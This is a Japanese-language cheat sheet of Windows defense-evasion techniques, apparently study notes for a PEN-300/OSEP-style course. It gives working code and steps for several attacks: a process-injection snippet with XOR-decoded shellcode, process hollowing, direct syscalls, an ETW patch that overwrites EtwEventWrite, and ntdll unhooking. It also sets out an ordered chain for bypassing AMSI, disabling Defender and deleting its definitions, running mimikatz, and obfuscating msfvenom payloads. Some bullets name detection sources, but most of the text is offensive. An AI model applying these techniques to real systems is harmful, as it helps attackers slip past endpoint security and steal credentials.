VBA マクロ内でのアーキ判定 (初期実行段階):

vb
Sub CheckArch()
    Dim is64 As Boolean
    Set wmi = GetObject("winmgmts:\\.\root\CIMV2")
    Set procs = wmi.ExecQuery("SELECT * FROM Win32_Process WHERE Name = 'explorer.exe'")
    For Each p In procs
        is64 = (InStr(1, p.ExecutablePath, "Program Files (x86)", vbTextCompare) = 0)
        Exit For
    Next
End Sub

Decision matrix

Recon 結果次のアクション
Is64BitProcess=Truex64 ペイロード (windows/x64/...)
Is64BitProcess=Falsex86 ペイロード。または SysWOW64 経由の 64bit powershell.exe を強制
LanguageMode=ConstrainedLanguageSection 03 (CLM bypass) を必須実行、.NET ベースへ
AppLocker 有効Section 02 (LOLBAS / InstallUtil 経由)
IsTamperProtected=TrueSet-MpPreference 不可 → サービス停止 / 定義削除へ
Real-time protection 有効certutil / bitsadmin 直取得は検知される → 暗号化ペイロード
EDR プロセス検出Defender 無効化のみでは不十分 → Section 09 (Direct Syscall / Unhook)
RunAsPPL=1Mimikatz sekurlsa::* 不可 → Section 07 (mimidrv / vulnerable driver)
検知 / detection
  • 短時間に発行される Get-MpComputerStatus / Get-AppLockerPolicy / Get-ItemProperty ...\Lsa の連鎖は PowerShell/Operational (EID 4104) で追跡可能
  • WMI 経由の SELECT * FROM Win32_Process は Microsoft-Windows-WMI-Activity/Operational で観測できる
  • tasklist /svc | findstr による EDR プロダクト名列挙は Sysmon EID 1 で親子関係とともに残る

using System;
using System.Runtime.InteropServices;

class Program {
    [DllImport("kernel32.dll")] static extern IntPtr OpenProcess(uint a, bool b, int p);
    [DllImport("kernel32.dll")] static extern IntPtr VirtualAllocEx(IntPtr h, IntPtr a, uint s, uint t, uint p);
    [DllImport("kernel32.dll")] static extern bool  WriteProcessMemory(IntPtr h, IntPtr a, byte[] b, int s, out IntPtr w);
    [DllImport("kernel32.dll")] static extern IntPtr CreateRemoteThread(IntPtr h, IntPtr a, uint s, IntPtr f, IntPtr p, uint c, IntPtr t);

    static void Main(string[] args) {
        int pid = System.Diagnostics.Process.GetProcessesByName("explorer")[0].Id;
        byte[] buf = new byte[] { /* XOR encoded shellcode */ };
        for (int i = 0; i < buf.Length; i++) buf[i] ^= 0xfa;

        IntPtr h    = OpenProcess(0x001F0FFF, false, pid);
        IntPtr addr = VirtualAllocEx(h, IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);

NtQueueApc injection

CreateProcessW で suspended プロセスを作り、QueueUserAPC で APC キューへ、ResumeThread で発火。Sysmon EID 8 (CreateRemoteThread) を回避できる。

Process Hollowing

CreateProcessW(CREATE_SUSPENDED) → NtUnmapViewOfSection → VirtualAllocEx → WriteProcessMemory → entry point 書換 → ResumeThread。PEB から ImageBaseAddress 取得、e_lfanew (0x3C) → AddressOfEntryPoint (e_lfanew + 0x28) で entry point を算出する。PEN-300 range の定番手法。

Direct syscall (userland hook 回避)

EDR が ntdll.dll の Nt* をフックしている場合、直接 syscall を発行する。SSN の解決は静的テーブル / 動的取得 (Hell's Gate / Halo's Gate) のいずれか。

  • SysWhispers3: klezVirus/SysWhispers3
  • Hell's Gate / Halo's Gate: SSN 動的解決の代表実装
bash
python3 syswhispers.py -f NtAllocateVirtualMemory,NtWriteVirtualMemory,NtCreateThreadEx,NtWaitForSingleObject -o syscalls

ETW patch (.NET 実行ログ抑止)

csharp
// EtwEventWrite の先頭を ret (0xC3) で上書き
IntPtr addr = GetProcAddress(LoadLibrary("ntdll.dll"), "EtwEventWrite");
VirtualProtect(addr, (UIntPtr)1, 0x40, out uint old);
Marshal.Copy(new byte[] { 0xC3 }, 0, addr, 1);

Unhook (ntdll 復元)

ディスクから ntdll.dll を再読込し、メモリ上のフック済みセクションを上書き。既存 C2 の多くが同種機構を実装している。

検知 / detection
  • Sysmon EID 8 (CreateRemoteThread), EID 10 (ProcessAccess) で高権限プロセスへのハンドル取得を追跡
  • ETW-Ti (Microsoft-Windows-Threat-Intelligence) は kernel 側で発火するため userland パッチで抑止できない
  • Kernel callbacks (PsSetCreateProcessNotifyRoutine 系) を用いる EDR は unhook では回避されない
  • ntdll の .text セクション整合性チェック (メモリ vs ディスク) を定期実行

10Chaining & Orderチェーン設計と要点

Execution order

  1. 環境偵察を絶対に省略しない — アーキ判定と CLM / AppLocker 確認なしにペイロードを生成すると無駄になる
  2. AMSI bypass → ペイロード読込 の順序を厳守 (逆だと初回読込で検知される)
  3. 新規 PowerShell セッションごとに AMSI bypass を再実行 (プロセス単位で揮発)
  4. CLM bypass 後に AMSI bypass (ConstrainedLanguage 下では [Ref] 等が制限される)
  5. Admin 取得後すぐ Defender 無効化 + 定義削除 → 後続の mimikatz / SharpHound 等が即時通る
  6. EDR 有り環境では Direct syscall を採用し userland フックを完全回避

Recommended obfuscation chain

text
msfvenom (raw) → XOR (key=0xfa) → C# 埋込 → ConfuserEx 難読化 → InstallUtil 経由実行 → Process Hollowing
要点 / key takeaways
  • アーキ判定 (Is64BitProcess) はペイロード選定の前提条件であり、ミスマッチは即失敗
  • CLM 環境では .NET 直接呼び出しが不可となるため、公開 bypass 実装を InstallUtil 経由で走らせ FullLanguage セッションへ昇格するのが定番
  • AMSI bypass はプロセス揮発性。新規 powershell.exe や新規 Runspace 生成のたびに再適用が必要
  • TamperProtection 有効時は Set-MpPreference が効かないため、サービス停止または DISM 削除に切替
  • EDR (CrowdStrike / SentinelOne 等) は Defender と独立してカーネルドライバで動作する。Defender 無効化のみでは足りず、Direct syscall または ntdll unhook が要る
  • SeImpersonate 権限はサービスアカウント侵害時の主要昇格経路。PrintSpoofer / GodPotato / SigmaPotato のいずれかで SYSTEM 化が可能
  • ホスト間のピボット時は防御層が変わるため、各ホストで Section 01 (環境偵察) を再実行する
